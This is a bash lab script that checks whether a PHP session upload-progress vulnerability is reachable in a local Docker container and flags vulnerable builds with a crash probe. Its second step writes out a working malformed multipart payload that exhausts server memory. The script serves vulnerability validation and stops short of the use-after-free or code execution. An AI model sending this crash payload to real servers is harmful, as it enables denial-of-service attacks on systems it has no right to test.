#!/usr/bin/env bash
# check_109619.sh - validate the CVE-2026-109619 (session upload-progress) code path
# on a LOCAL lab container, without any weaponized exploit.
#
# IMPORTANT - what this script does and does NOT prove:
#   Step 1 shows the upload-progress CODE PATH is reachable (attacker input reaches
#   the handler the use-after-free lives in). It does NOT distinguish a vulnerable
#   build from a patched one: a PATCHED server writes the SAME session file, because
#   the fix repairs the use-after-free, not the upload-progress feature. So step 1
#   alone is NOT proof that CVE-2026-109619 is present.
#
#   To decide vulnerable-vs-patched you need EITHER:
#     - the version / backport check (see the printed version + vendor changelog), OR
#     - the behavioural 109618 test, which DOES differ between patched and vulnerable
#       (run ../scanner/p2s_scan.py; patched stops at the parts limit, vulnerable OOMs).
#
#   Step 2 here runs that 109618 probe so you see the crash on this box.
#
# This script does NOT trigger or weaponize the use-after-free, and running commands
# (RCE) via the bug is a separate exploitation step it deliberately does not perform.
#
# LAB USE ONLY - it toggles session.upload_progress.cleanup and restarts Apache
# inside the container, then restores the config.
#
# Usage:  ./check_109619.sh [container] [port] [marker]
#         ./check_109619.sh php2shell-8.4 8084                 (default)
#         ./check_109619.sh php2shell-8.3 8083 MY-TEST-123     (custom marker)

set -u
C="${1:-php2shell-8.4}"
P="${2:-8084}"
MARK="${3:-PROOF-$(date +%s)-$$}"   # attacker-controlled marker, ends up inside the file
URL="http://127.0.0.1:${P}/index.php"
SESS="labproof$$"   # no underscore: PHP rejects session ids outside [0-9a-zA-Z,-]
TMP="$(mktemp -d)"
trap 'rm -rf "$TMP"' EXIT

run() { docker exec "$C" sh -c "$1"; }

echo "=== target: $C  ($URL) ==="
if ! docker ps -q -f "name=^${C}$" | grep -q .; then
  echo "container $C is not running - start it with ../run.sh"; exit 1
fi

echo
echo "--- config preconditions ---"
curl -s "$URL" | grep -E 'PHP_VERSION|SAPI|upload_progress|backtraces'
run 'php -r "echo \"session_ext=\".(extension_loaded(\"session\")?\"yes\":\"no\").\"  field=\".ini_get(\"session.upload_progress.name\").\"\n\";"'

echo
echo "--- 1) REACHABLE (code path only; does NOT prove vuln vs patched) ---"
# cleanup=Off so the progress file survives after the upload finishes (lab only).
# -k restart re-reads config without stopping PID 1; a config reload can take a
# moment to reach a fresh worker, so we retry the upload until one serves it.
run 'echo session.upload_progress.cleanup=Off > /usr/local/etc/php/conf.d/zzz-109619.ini; apache2ctl -k restart' >/dev/null 2>&1
SAVE="$(run 'php -r "echo session_save_path()?:\"/tmp\";"')"
TARGET="${SAVE}/sess_${SESS}"
echo "marker sent : $MARK"
echo "target file : $TARGET  (inside container $C)"
echo "before      : $(run "ls $TARGET 2>/dev/null" || echo '(absent)')"
printf '%s' "$MARK" > "$TMP/f.txt"       # uploaded file content = the marker too
got=""
for try in 1 2 3 4 5 6 7 8; do
  sleep 1
  # plain, well-formed upload; progress field value = our marker, tracked by the handler
  curl -s -o /dev/null -b "PHPSESSID=${SESS}" "$URL" \
    -F "PHP_SESSION_UPLOAD_PROGRESS=${MARK}" -F "f=@$TMP/f.txt"
  if run "cat $TARGET 2>/dev/null" | grep -q "$MARK"; then got=1; break; fi
done
if [ -n "$got" ]; then
  echo "[PROVEN] handler executed (try $try) - file created in the container with MY marker:"
  run "ls -l $TARGET" | sed 's/^/    /'
  run "cat $TARGET" | sed 's/^/    /'; echo
  echo
  echo "    >>> VERIFY IT YOURSELF (the file is left in place):"
  echo "        docker exec $C ls -l $TARGET"
  echo "        docker exec $C cat $TARGET"
  echo "        docker exec $C grep -c '$MARK' $TARGET      # expect: 1"
  echo
  echo "    >>> CLEAN UP when done:"
  echo "        docker exec $C rm -f $TARGET"
else
  echo "[not observed] no marked file written (handler disabled on this host)"
fi
# restore config only (leave the proof file so you can inspect it); remove stray uploads
run "rm -f /usr/local/etc/php/conf.d/zzz-109619.ini ${SAVE}/phpr* 2>/dev/null; apache2ctl -k restart" >/dev/null 2>&1

echo
echo "--- 2) UNSTABLE: crash-shape probe through the active handler ---"
python3 - "$TMP/crash.bin" <<'PY'
import sys
size=1<<20
name=b"a[]"+b"[a]"*62
up=b"--\nContent-Disposition:name=PHP_SESSION_UPLOAD_PROGRESS\n\nlabtest\n"
part=b"--\nContent-Disposition:name="+name+b";filename=\n\n"
base=up+part*4000
filler=(size-len(base))//3
open(sys.argv[1],"wb").write((b"--\n"+b"x:\n"*filler+base[3:])[:-1])
PY
MARK=$(date -u +%s)
BEFORE="$(run 'pgrep -c apache2')"
RESP="$(curl -s -b "PHPSESSID=${SESS}c" "$URL" -H 'Content-Type: multipart/form-data; boundary=' --data-binary @"$TMP/crash.bin")"
AFTER="$(run 'pgrep -c apache2')"
echo "$RESP" | grep -qi 'Allowed memory size' \
  && echo "[PROVEN] request crashed: $(echo "$RESP" | grep -oi 'Allowed memory size[^<]*')" \
  || echo "[not observed] no OOM crash (patched? check version)"
echo "apache workers before=$BEFORE after=$AFTER  (unchanged = graceful crash, no segfault)"
echo "kernel segfaults, if any:"; run "dmesg 2>/dev/null | grep -i segfault | tail -3" || echo "    (dmesg not readable in container - check 'docker logs $C')"

echo
echo "=== summary ==="
echo "Step 1 = code path reachable (NOT a vuln/patched test: patched writes the same file)."
echo "Step 2 = 109618 behavioural crash (THIS differs patched vs vulnerable)."
echo "Vuln vs patched verdict comes from step 2 + the PHP version, NOT from step 1."
echo "A use-after-free trigger / RCE is NOT attempted by this script."
